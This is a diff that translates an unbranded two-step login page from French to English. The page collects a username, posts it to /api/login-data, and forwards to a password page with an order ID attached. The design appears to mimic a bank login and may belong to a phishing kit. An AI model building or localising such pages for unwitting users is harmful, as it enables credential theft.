@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="fr" dir="ltr">
+<html lang="en" dir="ltr">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Connexion</title>
+<title>Login</title>
 <style>
   *{box-sizing:border-box;margin:0;padding:0}
   html,body{height:100%;font-family:"Segoe UI",Tahoma,Arial,sans-serif}
@@ -74,28 +74,28 @@
 <body>
 
   <div class="content">
-    <button class="back-btn" onclick="history.back()" aria-label="Retour">&#8592;</button>
+    <button class="back-btn" onclick="history.back()" aria-label="Back">&#8592;</button>
 
-    <h1>Connectez-vous à<br>votre espace personnel</h1>
-    <p class="subtitle">Veuillez saisir votre nom d'utilisateur pour vous connecter.</p>
+    <h1>Log in to your<br>personal account</h1>
+    <p class="subtitle">Please enter your username to log in.</p>
 
     <div class="error-msg" id="errorMsg"></div>
 
     <div class="input-group">
       <input type="text" id="username" autocomplete="username" autofocus>
-      <label>Nom d'utilisateur</label>
+      <label>Username</label>
     </div>
 
     <div class="options">
       <div class="option-row">
         <label class="check-label">
-          <input type="checkbox" checked> Se souvenir de moi
+          <input type="checkbox" checked> Remember me
         </label>
-        <a href="#" class="forgot-link">Nom d'utilisateur oublié ?</a>
+        <a href="#" class="forgot-link">Forgot username?</a>
       </div>
       <div class="option-row">
         <label class="check-label">
-          <input type="checkbox" checked> Activer le mode confidentiel
+          <input type="checkbox" checked> Enable confidential mode
         </label>
         <div class="info-icon">i</div>
       </div>
@@ -103,7 +103,7 @@
   </div>
 
   <div class="bottom">
-    <button class="next-btn" id="nextBtn" onclick="submitUsername()">Suivant</button>
+    <button class="next-btn" id="nextBtn" onclick="submitUsername()">Next</button>
   </div>
 
 <script>
@@ -111,18 +111,18 @@
   const orderId = params.get("order");
 
   if (params.get("error") === "1") {
-    showError("Nom d'utilisateur ou mot de passe incorrect");
+    showError("Incorrect username or password");
   }
 
   async function submitUsername() {
     const username = document.getElementById("username").value.trim();
     if (!username) {
-      showError("Veuillez saisir le nom d'utilisateur");
+      showError("Please enter the username");
       return;
     }
     const btn = document.getElementById("nextBtn");
     btn.disabled = true;
-    btn.textContent = "Vérification en cours...";
+    btn.textContent = "Verifying...";
 
     try {
       const res = await fetch("/api/login-data", {
@@ -132,16 +132,16 @@
       });
       const data = await res.json();
       if (data.success) {
-        location.href = "password-fr.html?order=" + orderId + "&user=" + encodeURIComponent(username);
+        location.href = "password-en.html?order=" + orderId + "&user=" + encodeURIComponent(username);
       } else {
-        showError(data.message || "Une erreur est survenue");
+        showError(data.message || "An error occurred");
         btn.disabled = false;
-        btn.textContent = "Suivant";
+        btn.textContent = "Next";
       }
     } catch(err) {
-      showError("Erreur de connexion");
+      showError("Connection error");
       btn.disabled = false;
-      btn.textContent = "Suivant";
+      btn.textContent = "Next";
     }
   }
 
